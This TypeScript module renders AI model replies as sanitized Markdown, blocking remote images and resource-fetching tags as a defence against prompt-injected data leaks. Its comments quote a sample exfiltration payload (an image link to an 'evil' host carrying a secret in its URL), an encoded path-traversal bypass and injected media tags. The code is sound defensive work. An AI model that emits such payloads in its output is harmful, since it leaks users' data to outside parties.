import DOMPurify from "dompurify";
import { marked } from "marked";
import { t } from "./i18n";

marked.setOptions({ breaks: true, gfm: true });

// A model reply is untrusted: a prompt-injected `![](https://evil/?d=secret)`
// would otherwise load with zero clicks and leak data in the URL. So only
// inline data:image/* and the app's own static image folders may render as
// images (the CSP's img-src enforces same-origin as a second layer). Other
// same-origin paths are refused too: an <img> pointing at /api/... or
// /host/... would fire a cookie-carrying GET at the panel's own endpoints.
const ALLOWED_IMAGE_PREFIXES = ["/icons/", "/assets/"];

const RESOLVE_ORIGIN = "https://rona.invalid";

function isAllowedImageSrc(src: string): boolean {
  const value = src.trim();
  if (/^data:image\//i.test(value)) return true;
  // A literal ".." check is not enough: `/assets/%2e%2e/api/x` is decoded and
  // dot-segment-normalized by the browser/server later. So resolve it the way
  // they will and judge the result.
  let decoded: string;
  try {
    decoded = decodeURIComponent(value);
  } catch {
    return false;
  }
  if (decoded.includes("..") || decoded.includes("\\") || value.includes("\\"))
    return false;
  let resolved: URL;
  try {
    resolved = new URL(value, RESOLVE_ORIGIN);
  } catch {
    return false;
  }
  if (resolved.origin !== RESOLVE_ORIGIN) return false;
  let path: string;
  try {
    path = decodeURIComponent(resolved.pathname);
  } catch {
    return false;
  }
  return ALLOWED_IMAGE_PREFIXES.some((prefix) => path.startsWith(prefix));
}

// DOMPurify hooks are global, so register them once at module load.
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node instanceof HTMLImageElement) {
    if (isAllowedImageSrc(node.getAttribute("src") ?? "")) return;
    const placeholder = node.ownerDocument.createElement("span");
    placeholder.className = "image-blocked";
    const alt = (node.getAttribute("alt") ?? "").trim();
    placeholder.textContent = `\u{1F5BC} [${t("markdown.image_blocked")}${alt ? `: ${alt}` : ""}]`;
    node.replaceWith(placeholder);
    return;
  }
  if (node instanceof HTMLAnchorElement && node.hasAttribute("href")) {
    node.setAttribute("target", "_blank");
    node.setAttribute("rel", "noopener noreferrer nofollow");
  }
});

export function renderMarkdown(source: string): string {
  const html = marked.parse(source, { async: false }) as string;
  return DOMPurify.sanitize(html, {
    // Besides <img> (vetted by the hook above), every element that can fetch a
    // remote resource is dropped: a prompt-injected <video src> / <svg><image
    // href> would otherwise leak data with zero clicks. Markdown has no use
    // for any of them.
    FORBID_TAGS: [
      "form",
      "input",
      "button",
      "iframe",
      "object",
      "embed",
      "style",
      "source",
      "video",
      "audio",
      "track",
      "picture",
      "svg",
      "image",
      "use",
      "link",
      "meta",
      "base",
    ],
    FORBID_ATTR: [
      "style",
      "srcset",
      "poster",
      "xlink:href",
      "background",
      "ping",
    ],
  });
}
